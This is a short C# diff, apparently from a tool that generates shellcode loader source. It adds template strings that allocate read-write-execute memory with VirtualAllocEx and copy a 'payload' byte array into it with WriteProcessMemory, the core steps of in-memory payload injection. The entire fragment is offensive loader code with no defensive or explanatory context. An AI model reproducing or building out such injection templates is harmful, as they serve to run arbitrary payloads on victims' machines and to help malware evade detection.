@@ -152,14 +152,29 @@ catch
         #region PINVOKES
         private static readonly string dllImportAttrib = "[DllImport(\"kernel32.dll\", SetLastError = true)]\n";
 
-        #region WriteVirtualMemory
-        private static readonly string sig_WriteVirtualMemory = "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);";
-        public static string pinvoke_WriteVirtualMemory = dllImportAttrib + sig_WriteVirtualMemory;
-        #endregion
-
         #region VirtualAllocEx
         private static readonly string sig_VirtualAllocEx = "public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);";
         public static string pinvoke_VirtualAllocEx = dllImportAttrib + sig_VirtualAllocEx;
+        public static string call_VirtualAllocEx = @"
+IntPtr pMemoryAllocation = VirtualAllocEx(hCurrentProcess, IntPtr.Zero, (uint)(payload.Length), 0x3000, 0x40);
+if (pMemoryAllocation == IntPtr.Zero)
+{
+    return;
+}
+";
+        #endregion
+
+        #region WriteVirtualMemory
+        private static readonly string sig_WriteVirtualMemory = "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);";
+        public static string pinvoke_WriteVirtualMemory = dllImportAttrib + sig_WriteVirtualMemory;
+
+        public static string call_WriteVirtualMemory = @"
+UIntPtr bytesWritten;
+if (!PInvokes.WriteProcessMemory(hCurrentProcess, pMemoryAllocation, payload, (uint)(payload.Length), out bytesWritten))
+{
+    return;
+}
+";
         #endregion
 
         #endregion
